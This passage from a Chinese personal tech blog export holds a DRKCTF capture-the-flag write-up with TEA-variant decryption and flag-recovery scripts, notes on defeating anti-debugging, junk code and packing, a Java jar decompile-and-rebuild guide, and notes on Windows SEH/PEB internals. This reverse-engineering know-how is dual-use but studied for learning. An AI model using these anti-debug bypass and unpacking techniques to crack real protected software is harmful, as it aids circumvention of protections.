class="number">0x3412</span>,<span class="number">0x4123</span> &#125;<span class="comment">;</span></span><br><span class="line">btea((unsigned*)(fakefalg + <span class="number">1</span>), -<span class="number">15</span>, key)<span class="comment">;</span></span><br><span class="line">printf(<span class="string">&quot;解密后的数据：%s\n&quot;</span>, (char*)fakefalg)<span class="comment">;</span></span><br><span class="line">return <span class="number">0</span><span class="comment">;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到假flag：</p><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DRKCTF&#123;Sorry.There<span class="number">_</span><span class="keyword">is</span><span class="number">_n</span>o<span class="number">_m</span>ore<span class="number">_f</span>lower<span class="number">_</span>tea.Please<span class="number">_</span><span class="keyword">try</span><span class="number">_</span>again!!&#125;</span><br></pre></td></tr></table></figure><p>很明显，这个不是真flag，这说明：<br>动态调试的时候和正常的时候运行的逻辑不一样<br>第一时间会想到这个可能是smc或者hook<br>所以先查看encode的交叉引用。<br>于是找到这个函数：<br><img src="https://cdn.nlark.com/yuque/0/2024/png/33730407/1716733829975-153319f8-74d5-4986-8a9e-8f768ac45af7.png#averageHue=%23262523&amp;clientId=u9fbe6832-1fb1-4&amp;from=paste&amp;id=ue3859d07&amp;originHeight=175&amp;originWidth=342&amp;originalType=url&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=13519&amp;status=done&amp;style=none&amp;taskId=u3580044d-d353-4778-a37c-19359f8ce4a&amp;title=" alt="image.png"><br>可以看到上层函数<br>修改了encode中的前几个字节用ret的方法返回到sub_140012A0中<br><img src="https://cdn.nlark.com/yuque/0/2024/png/33730407/1716733829989-1a9f71ea-f342-424a-af46-2cb10c1d5fee.png#averageHue=%23212120&amp;clientId=u9fbe6832-1fb1-4&amp;from=paste&amp;id=uc3c9f92e&amp;originHeight=449&amp;originWidth=1207&amp;originalType=url&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=33860&amp;status=done&amp;style=none&amp;taskId=uf9eb6404-6a25-4a29-80c0-ffd3c2e2565&amp;title=" alt="image.png"><br>这里的第一个是反调试，在x64下，调试标志位在PEB表偏移0x2的位置，通过获取gs寄存器找到peb表的位置：<br>readsqword(0x62)得到调试标志位并判断当前进程是否在调试<br><img src="https://cdn.nlark.com/yuque/0/2024/png/33730407/1716733829985-4afa9be0-9bb4-4cb8-9f55-5dd9c717c765.png#averageHue=%23232222&amp;clientId=u9fbe6832-1fb1-4&amp;from=paste&amp;id=u7808a012&amp;originHeight=180&amp;originWidth=741&amp;originalType=url&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=9782&amp;status=done&amp;style=none&amp;taskId=ud6d90f24-7c4d-416e-a406-ac032578606&amp;title=" alt="image.png"><br>block是单纯地得到对应的两个函数地址<br>get_virtual_protect中，通过异或把virtualprotect函数名隐藏并通过搜索它在kernel32.dll中位置返回函数地址<br><img src="https://cdn.nlark.com/yuque/0/2024/png/33730407/1716733829987-92034861-23bc-47d2-9e95-b4f30fa85fbe.png#averageHue=%23232221&amp;clientId=u9fbe6832-1fb1-4&amp;from=paste&amp;id=ud99782d9&amp;originHeight=483&amp;originWidth=557&amp;originalType=url&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=29585&amp;status=done&amp;style=none&amp;taskId=u93815ed8-e441-450f-b0cc-314164f4205&amp;title=" alt="image.png"><br>通过上面的分析，可以得出我们需要查看sub_140012A0的内容，这里才是真正的加密函数<br>打开，还是花QAQ<br>汇编中，可以看到函数后段全是一个指令+一个jmp<br>由于汇编不是很好看，改成流程图看奇怪的地方。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/33730407/1716733829973-15def95e-8069-44cd-91a5-819ab44df3c5.png#averageHue=%23343436&amp;clientId=u9fbe6832-1fb1-4&amp;from=paste&amp;id=u120b6f3f&amp;originHeight=899&amp;originWidth=326&amp;originalType=url&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=9261&amp;status=done&amp;style=none&amp;taskId=u70f5eff6-e16f-4590-91c9-49d7be337ea&amp;title=" alt="image.png"><br>可以猜测：如果一个地方有一块代码，并且有连续jmp，这里可能是人工加的花<br>那么就先看一下那个很远的环和上面一排没有入口的块<br>1<br><img src="https://cdn.nlark.com/yuque/0/2024/png/33730407/1716733832192-cef5fe2c-e686-4d46-b327-e5d7a3c01b20.png#averageHue=%23212120&amp;clientId=u9fbe6832-1fb1-4&amp;from=paste&amp;id=u0fa192bf&amp;originHeight=821&amp;originWidth=634&amp;originalType=url&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=53017&amp;status=done&amp;style=none&amp;taskId=u0aa49f92-479d-4bac-b428-67c7d183fb5&amp;title=" alt="image.png"><br>这里能看到push和pop，所以从push进入花，从pop离开花，可以看出可以这样还原<br>2<br><img src="https://cdn.nlark.com/yuque/0/2024/png/33730407/1716733832265-37061b1b-0f12-4caf-8153-cba463e120d5.png#averageHue=%23242322&amp;clientId=u9fbe6832-1fb1-4&amp;from=paste&amp;id=u065c3468&amp;originHeight=933&amp;originWidth=1035&amp;originalType=url&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=123404&amp;status=done&amp;style=none&amp;taskId=u110b76e5-e698-4870-9616-0dac6ca2b32&amp;title=" alt="image.png"><br>这里有一个call，尝试跟着call走，它下一步修改了返回地址，减去5A<br>即：140001460<br>转换一下这里的指令<br><img src="https://cdn.nlark.com/yuque/0/2024/png/33730407/1716733832191-1cc0fbe0-3f81-4909-a497-5295e5abc4db.png#averageHue=%23282726&amp;clientId=u9fbe6832-1fb1-4&amp;from=paste&amp;id=u50bfb4ab&amp;originHeight=50&amp;originWidth=338&amp;originalType=url&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=2785&amp;status=done&amp;style=none&amp;taskId=ueb56bbeb-3453-4f58-b939-3e8e83aa1b3&amp;title=" alt="image.png"><br>所以把call nop了就好<br><img src="https://cdn.nlark.com/yuque/0/2024/png/33730407/1716733832182-3eb75a93-c094-4099-be25-76c4f9d44050.png#averageHue=%23535739&amp;clientId=u9fbe6832-1fb1-4&amp;from=paste&amp;id=ue655d849&amp;originHeight=215&amp;originWidth=428&amp;originalType=url&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=3787&amp;status=done&amp;style=none&amp;taskId=u28dc4c33-1a0b-4666-82b4-37908298542&amp;title=" alt="image.png"><br>3<br><img src="https://cdn.nlark.com/yuque/0/2024/png/33730407/1716733832201-20c08a69-26d7-4428-95f8-6a320ed5339b.png#averageHue=%23232221&amp;clientId=u9fbe6832-1fb1-4&amp;from=paste&amp;id=u9a6a4d18&amp;originHeight=270&amp;originWidth=476&amp;originalType=url&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=12030&amp;status=done&amp;style=none&amp;taskId=u6996037f-ff56-4fac-9424-57aa1df09f5&amp;title=" alt="image.png"><br>nop之后<br>然后全部u，c，p还原函数<br><img src="https://cdn.nlark.com/yuque/0/2024/png/33730407/1716733834495-e9f6427f-ca83-4dc5-9162-da08a490e772.png#averageHue=%2320201f&amp;clientId=u9fbe6832-1fb1-4&amp;from=paste&amp;id=ua1b08400&amp;originHeight=941&amp;originWidth=1251&amp;originalType=url&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=66758&amp;status=done&amp;style=none&amp;taskId=ud999defe-5b98-4c43-b6af-623c89dd5f4&amp;title=" alt="image.png"><br>这里又可以看到上面的一个奇怪return，看汇编可以发现还是一个花<br><img src="https://cdn.nlark.com/yuque/0/2024/png/33730407/1716733834450-c2ef6d71-3686-447f-ab49-66e8d87bac19.png#averageHue=%23272221&amp;clientId=u9fbe6832-1fb1-4&amp;from=paste&amp;id=uad94fd86&amp;originHeight=387&amp;originWidth=835&amp;originalType=url&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=28232&amp;status=done&amp;style=none&amp;taskId=uddf8219b-4679-4003-a0a0-f0876da42bd&amp;title=" alt="image.png"><br>直接把call到retn去掉（除了shl）<br>这是一个变体tea，尝试化简这个函数<br><img src="https://cdn.nlark.com/yuque/0/2024/png/33730407/1716733834514-bfee2ec3-61aa-4829-9c9b-096656970bac.png#averageHue=%2320201f&amp;clientId=u9fbe6832-1fb1-4&amp;from=paste&amp;id=uc65b387a&amp;originHeight=910&amp;originWidth=974&amp;originalType=url&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=89317&amp;status=done&amp;style=none&amp;taskId=uc8d53d53-53c1-44c7-af9e-dc9500873e0&amp;title=" alt="image.png"><br>写脚本直接解<br>exp:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdarg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdint.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dectrueTEA</span><span class="params">(<span class="type">uint32_t</span>* flag, <span class="type">uint32_t</span>* key, <span class="type">uint32_t</span> E)</span> </span>&#123;</span><br><span class="line"><span class="type">int</span> i, j;</span><br><span class="line"><span class="type">const</span> <span class="type">uint32_t</span> delta[<span class="number">4</span>] = &#123; <span class="number">0x59578627</span> ,<span class="number">0xe1c49e72</span>,<span class="number">0xbc24167f</span> ,<span class="number">0x8c3da26b</span> &#125;;</span><br><span class="line"><span class="type">uint32_t</span> e = E;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> len = <span class="number">15</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i += <span class="number">4</span>) &#123;</span><br><span class="line"><span class="type">uint32_t</span>* c[<span class="number">4</span>] = &#123; &amp;flag[(len - (i + <span class="number">3</span>)) % len],&amp;flag[(len - (i + <span class="number">2</span>)) % len],&amp;flag[(len - (i + <span class="number">1</span>)) % len],&amp;flag[(len - i) % len] &#125;;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">32</span>; j &gt;= <span class="number">0</span>; j--) &#123;</span><br><span class="line">*c[<span class="number">3</span>] -= ((e ^ *c[<span class="number">2</span>]) ^ (key[(j + <span class="number">3</span>) % <span class="number">4</span>] &gt;&gt; <span class="number">2</span>)) ^ (e &lt;&lt; <span class="number">1</span>);</span><br><span class="line">e -= delta[*c[<span class="number">3</span>] % <span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">*c[<span class="number">2</span>] -= ((e ^ *c[<span class="number">1</span>]) ^ (key[(j + <span class="number">2</span>) % <span class="number">4</span>] &lt;&lt; <span class="number">3</span>)) ^ (e &gt;&gt; <span class="number">2</span>);</span><br><span class="line">e -= delta[*c[<span class="number">2</span>] % <span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">*c[<span class="number">1</span>] -= ((e ^ *c[<span class="number">0</span>]) ^ (key[(j + <span class="number">1</span>) % <span class="number">4</span>] &gt;&gt; <span class="number">1</span>)) ^ (e &lt;&lt; <span class="number">4</span>);</span><br><span class="line">e -= delta[*c[<span class="number">1</span>] % <span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">*c[<span class="number">0</span>] -= ((e ^ *c[<span class="number">3</span>]) ^ (key[j % <span class="number">4</span>] &lt;&lt; <span class="number">2</span>)) ^ (e &gt;&gt; <span class="number">3</span>);</span><br><span class="line">e -= delta[*c[<span class="number">0</span>] % <span class="number">4</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//printf(&quot;\n0x%x 0x%x 0x%x 0x%x\n&quot;, *c[0], *c[1], *c[2], *c[3]);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, flag);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line"><span class="type">uint32_t</span> E = <span class="number">0</span>;</span><br><span class="line"><span class="type">uint32_t</span> k1[<span class="number">4</span>] = &#123; <span class="number">0x1234</span>,<span class="number">0x2341</span>,<span class="number">0x3412</span>,<span class="number">0x4123</span> &#125;;</span><br><span class="line"><span class="type">uint32_t</span> a[] = &#123; <span class="number">0x127DC4E1</span>, <span class="number">0xCBA0EC0E</span>, <span class="number">0x570EDF5B</span>, <span class="number">0x99062A35</span>, <span class="number">0x382A7E1B</span>, <span class="number">0x15E46742</span>, <span class="number">0x4E5E456F</span>, <span class="number">0x3834C1D6</span>, <span class="number">0x5EF778A5</span>, <span class="number">0xAF217212</span>, <span class="number">0xC2D79D20</span>, <span class="number">0xD5C5935F</span>, <span class="number">0xCD2F5BB</span>, <span class="number">0xC527398C</span>, <span class="number">0x5EAC6739</span> &#125;;</span><br><span class="line">E = <span class="number">0xAE58570C</span>;</span><br><span class="line"><span class="built_in">dectrueTEA</span>(a, k1, E);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id=""></h3><h3 id="Debug">Debug</h3><p>die看不出来壳，但是ida可以，所以用x64dbg到脱完壳的地方，</p><p>不过得先调试，结果用ida调试直接寄在tls的call rax里面，用x64dbg一点事都没有，百思不得其解，最后发现</p><p><img src="https://s2.loli.net/2024/05/29/lfk2bu7oR6UGThp.png" alt="image-20240529215820329"></p><p>tls里面有个反调试，在解壳之前，所以得先跳过，dbg里面自带的插件直接秒了，所以dbg就没事QAQ</p><p>这个感觉很不错，要是有办法在ida里面用就好了</p><p>记录一下用工具修复iat表的过程：</p><p>x64dbg 插件 scylla</p><p><img src="https://s2.loli.net/2024/05/29/Q8fl1qEwGeXRmZx.png" alt="image-20240529205550754"></p><p>去反调试，然后把smc搞出来，直接解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> prism <span class="keyword">import</span> *</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">last = [<span class="number">0xCF</span>, <span class="number">0xD9</span>, <span class="number">0xC0</span>, <span class="number">0xC8</span>, <span class="number">0xDF</span>, <span class="number">0xCD</span>, <span class="number">0x0C</span>, <span class="number">0xD2</span>, <span class="number">0x43</span>, <span class="number">0x98</span>, <span class="number">0x10</span>, <span class="number">0xC0</span>, <span class="number">0x83</span>, <span class="number">0x43</span>, <span class="number">0x9A</span>, <span class="number">0x10</span>, <span class="number">0xCD</span>, <span class="number">0x42</span>, <span class="number">0x8C</span>, <span class="number">0x4A</span>, <span class="number">0x10</span>, <span class="number">0xC8</span>, <span class="number">0x82</span>, <span class="number">0x83</span>, <span class="number">0x4A</span>, <span class="number">0x9F</span>, <span class="number">0x8C</span>, <span class="number">0xDF</span>, <span class="number">0x98</span>, <span class="number">0x42</span>, <span class="number">0x8C</span>, <span class="number">0xDF</span>, <span class="number">0x84</span>, <span class="number">0x82</span>, <span class="number">0x83</span>, <span class="number">0x46</span>, <span class="number">0x52</span>, <span class="number">0x52</span>, <span class="number">0x52</span>,<span class="number">0xE</span>]</span><br><span class="line"><span class="keyword">for</span> <span class="built_in">len</span> <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">        k = c</span><br><span class="line">        <span class="keyword">if</span> c &lt;=<span class="number">0x40</span> <span class="keyword">or</span> c&gt;=<span class="number">0x5b</span>:</span><br><span class="line">            <span class="keyword">if</span> c&lt;=<span class="number">0x60</span> <span class="keyword">or</span> c &gt;= <span class="number">0x7b</span>:</span><br><span class="line">                c-=<span class="number">30</span></span><br><span class="line">                c^=<span class="number">0x51</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                c-=<span class="number">32</span></span><br><span class="line">                c^=<span class="number">0xcd</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            c+=<span class="number">32</span></span><br><span class="line">            c^=<span class="number">0xab</span></span><br><span class="line">        <span class="keyword">if</span> c==last[<span class="built_in">len</span>]:</span><br><span class="line">            flag+=<span class="built_in">chr</span>(k)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#DRKCTF&#123;Y0u_Kn0w_F1a9_Con9raTu1aTion5!!!&#125;</span></span><br></pre></td></tr></table></figure><h3 id="一起做杯下午茶吧">一起做杯下午茶吧</h3><p>不会QAQ</p><h2 id="Osint">Osint</h2><h3 id="羡慕群友每一天">羡慕群友每一天</h3><p>直接开搜</p><p><img src="https://s2.loli.net/2024/05/27/D9qgF3a4ZLxtCvP.png" alt="image-20240527145103522"></p><p>发现不是中间圆心的位置好像不一样</p><p>找另一个</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">DRKCTF</span><span class="template-variable">&#123;美国-弗罗里达州-迈阿密-Skyviews&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">DRKCTF</span><span class="template-variable">&#123;美国-佛罗⾥达州-迈阿密-Skyviews&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">DRKCTF</span><span class="template-variable">&#123;美国-佛罗里达州-迈阿密-Skyviews&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">DRKCTF</span><span class="template-variable">&#123;美国-佛罗里达州-迈阿密州-Skyviews&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">DRKCTF</span><span class="template-variable">&#123;美国-佛罗里达州-迈阿密市-Skyviews&#125;</span></span><br></pre></td></tr></table></figure><p>第五个是对的</p><h2 id="Misc">Misc</h2><h3 id="DNA-5">DNA -5</h3><p>提示：遥遥领先</p><p>抽象的题，没看wp之前我绝对想不到QAQ</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ACGCTAATACCATCAACTCCATAACTCCCCACCTAAATCCAATAACCAGCTAAATCCAATAACCACTACCCCTCCATAAGAGAATAACCACTCATCCCCCTAATAAGAATAAACCTCCCCCAC</span></span><br></pre></td></tr></table></figure><p>根据wp，由遥遥领先想到5G，又因为-5，所以可以想到要少5个G</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ACCTAATACCATCAACTCCATAACTCCCCACCTAAATCCAATAACCACTAAATCCAATAACCACTACCCCTCCATAAAAATAACCACTCATCCCCCTAATAAAATAAACCTCCCCCAC</span></span><br></pre></td></tr></table></figure><p>看这个可以先试试DNA解密</p><p>不行</p><p>结果是摩斯</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">WIPXGU<span class="meta">%</span>u<span class="number">7</span>bSZ_SZ_<span class="number">1</span><span class="name">G5</span>_<span class="symbol">N0</span>IH<span class="number">3</span><span class="meta">%</span>u<span class="number">7</span>d</span><br><span class="line">WIPXGU&#123;SZ_SZ_<span class="number">1</span><span class="name">G5</span>_<span class="symbol">N0</span>IH<span class="number">3</span>&#125;</span><br></pre></td></tr></table></figure><p>然后解atbash</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DRKCTF&#123;H<span class="built_in">A_HA</span>_1T5_M0RS3&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 题集 </category>
          
          <category> CTF </category>
          
          <category> 比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> re </tag>
            
            <tag> cry </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记录一次修正网络bug</title>
      <link href="/posts/5afbca6a.html"/>
      <url>/posts/5afbca6a.html</url>
      
        <content type="html"><![CDATA[<p>不知道是什么时候开始，我的梯子出了一个bug（我感觉是安了idea破解插件之后QAQ）</p><p>首先这是基本信息：</p><p>我有一个梯子（同一个品牌）</p><p>一个是edge浏览器插件</p><p>一个是软件</p><p>根据这几天的观察，出现了以下现象：</p><ul><li>开启插件而关闭软件（上网策略+全局代理）：<br>只能进入cn.bing.com且网速很慢</li><li>开启插件而关闭软件（全局代理）：<br>网页浏览恢复正常，<a href="http://xn--www-u28d42be8rwr7i.bing.com">可以连上www.bing.com</a>，过一段时间变成不可以连上，并且修打开关闭上网策略都不行</li><li>开启软件而关闭插件（全局代理）：<br>网页浏览恢复正常，<a href="http://xn--www-u28d42be8rwr7i.bing.com">可以连上www.bing.com</a></li><li>两个都开启：<br>只能进入cn.bing.com且网速很慢</li><li>以前开启插件而关闭软件（上网策略+全局代理）：<br><a href="http://xn--www-u28d42be8rwr7i.bing.com">可以连上www.bing.com</a></li><li>bing会解析ip判断是连cn还是www</li><li>有的时候通过pip安装包会访问错误（国内源）但是开启软件就可以</li></ul><p><a href="http://xn--www-u28dl7mmcy3fmz7gul0aghdvypmtle27cgian7ax59d.bing.com">目前通过关闭上网策略来进入www.bing.com</a><br>外面的bug之后再修QAQ</p><p>看了一下设置：<br>上网策略中会把cn.bing.com直接连接不经过梯子</p>]]></content>
      
      
      <categories>
          
          <category> 实践 </category>
          
          <category> 记录 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>java逆向基本步骤</title>
      <link href="/posts/c2aa3be6.html"/>
      <url>/posts/c2aa3be6.html</url>
      
        <content type="html"><![CDATA[<p>今天玩杀戮尖塔，好玩，所以试了一下要怎么逆。</p><p>这个游戏是java写的，所以基本逻辑就是先把jar包反编译成java源文件，然后修改，然后用idea生成出jar包</p><p>这篇只是记录一下基本步骤：</p><p>1.反编译jar</p><p>这里使用的是idea的java-decompiler插件。</p><p>下载好之后找到java-decompiler插件的位置。</p><p>先生成一个文件夹，假设名字是test</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp <span class="string">&quot;C:\decompiler.jar&quot;</span> org<span class="selector-class">.jetbrains</span><span class="selector-class">.java</span><span class="selector-class">.decompiler</span><span class="selector-class">.main</span><span class="selector-class">.decompiler</span><span class="selector-class">.ConsoleDecompiler</span> -dgs=true target<span class="selector-class">.jar</span> test</span><br></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp <span class="string">&quot;decomiler路径&quot;</span> org<span class="selector-class">.jetbrains</span><span class="selector-class">.java</span><span class="selector-class">.decompiler</span><span class="selector-class">.main</span><span class="selector-class">.decompiler</span><span class="selector-class">.ConsoleDecompiler</span> -dgs=true 源jar路径 一个文件夹名</span><br></pre></td></tr></table></figure><p>如果正确，文件夹里会生成一个和刚刚同名的jar。解压之后得到源代码。</p><p>2.调整目录结构</p><p>由于解压后所有内容都是平铺的，需要调整目录结构让idea可以正确识别并生成，同时由于我逆的是游戏模组，所以还需要导入对应的游戏依赖包。</p><p>目录结构应该是：</p><p>test</p><ul><li>src<ul><li>main<ul><li>java<ul><li>源代码</li></ul></li><li>resources<ul><li>img</li><li>localization</li></ul></li></ul></li></ul></li></ul><p>生成jar</p><p>不是很懂maven，好像是一个管理器一样的东西，这个地方我用它来生成jar代码</p><p>详见：<a href="https://zhuanlan.zhihu.com/p/403468512">杀戮尖塔MOD制作详解</a></p><p>首先构建pom.xml</p><p>在里面填写对应的配置项</p><p>然后在右边选择package</p><p>它会自动生成，如果反编译的文件有问题，就手动修正一下（我只遇到了一个）</p><p>然后就能生成对应的jar文件了。</p><hr><p>一定要注意文件路径要正确，不然只能生成只有元数据的文件。</p>]]></content>
      
      
      <categories>
          
          <category> 实践 </category>
          
          <category> 知识集 </category>
          
          <category> 逆向 </category>
          
          <category> 记录 </category>
          
          <category> 语言 </category>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>seh-windows结构化异常处理研究</title>
      <link href="/posts/8c61c980.html"/>
      <url>/posts/8c61c980.html</url>
      
        <content type="html"><![CDATA[<p>SEH结构化异常处理：<br>本篇建议和Windows调试原理一起看</p><p>由于这个东西是基于线程的，所以先学习一下PEB和TEB</p><h2 id="TEB-PEB">TEB&amp;PEB</h2><p>线程环境块</p><p>系统在TEB中保存了最频繁使用的线程相关数据，大小为4kb。系统中每个进程都有一个自己的TEB，一个进程的所有TEB都以堆栈的形式存放在内存中。同理，PEB为进程环境块，TEB中有指向PEB的指针，每个进程的PEB也以堆栈形式放在内存中</p><ul><li>在x64架构环境下，<code>GS + 30h</code>处存储的是Teb结构体的基地址，<code>GS + 60h</code>处存储的是Peb结构体的基地址。</li><li>在x86架构环境下，<code>FS + 18h</code>处存储的是Teb结构体的基地址，<code>FS + 30h</code>处存储的是Peb结构体的基地址。</li></ul><p>而指向SEH链开头就是TEB的0号位<br>以下是TEB与seh的关系<br><img src="https://s2.loli.net/2024/05/04/GBMrJPKWZhiuNL2.png" alt="867232_UQX698BZWQ7UZ8Y"></p><h3 id="TEB重要成员">TEB重要成员</h3><ul><li>偏移0的NtTib线程信息块，含有ExceptionList</li><li>偏移0x30的ProcessEnvironmentBlock指向PEB，即进程环境块</li></ul><p>访问TEB ：NtCurrentTeb()或者按上面的方法直接取段寄存器</p><h2 id="PEB重要成员">PEB重要成员</h2><p>peb被teb偏移0x30的指针指向。</p><ul><li>偏移2的BeingDebugged标志</li><li>偏移8的ImageBaseAddress</li><li>偏移c的Ldr，保存加载模块的链表</li><li>偏移0x18的ProcessHeap，可用于反调试</li><li>偏移0x68的NtGlobalFlag，可用于反调试</li></ul><p>ImageBaseAddress表示进程的ImageBase，可以用GetModuleHandle(lpModuleName)获取</p><p>Ldr是一个结构体</p><p>visual studio中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">PEB_LDR_DATA</span> &#123;</span></span><br><span class="line">    BYTE Reserved1[<span class="number">8</span>];</span><br><span class="line">    PVOID Reserved2[<span class="number">3</span>];</span><br><span class="line">    LIST_ENTRY InMemoryOrderModuleList;<span class="comment">//x86偏移0x14,x64偏移0x20</span></span><br><span class="line">&#125; PEB_LDR_DATA, *PPEB_LDR_DATA;</span><br></pre></td></tr></table></figure><p>实际</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">PEB_LDR_DATA</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">　ULONG Length; <span class="comment">// +0x00</span></span><br><span class="line">　BOOLEAN Initialized; <span class="comment">// +0x04</span></span><br><span class="line">　PVOID SsHandle; <span class="comment">// +0x08内存对齐</span></span><br><span class="line">　LIST_ENTRY InLoadOrderModuleList; <span class="comment">// +0x0c</span></span><br><span class="line">　LIST_ENTRY InMemoryOrderModuleList; <span class="comment">// +0x14</span></span><br><span class="line">　LIST_ENTRY InInitializationOrderModuleList;<span 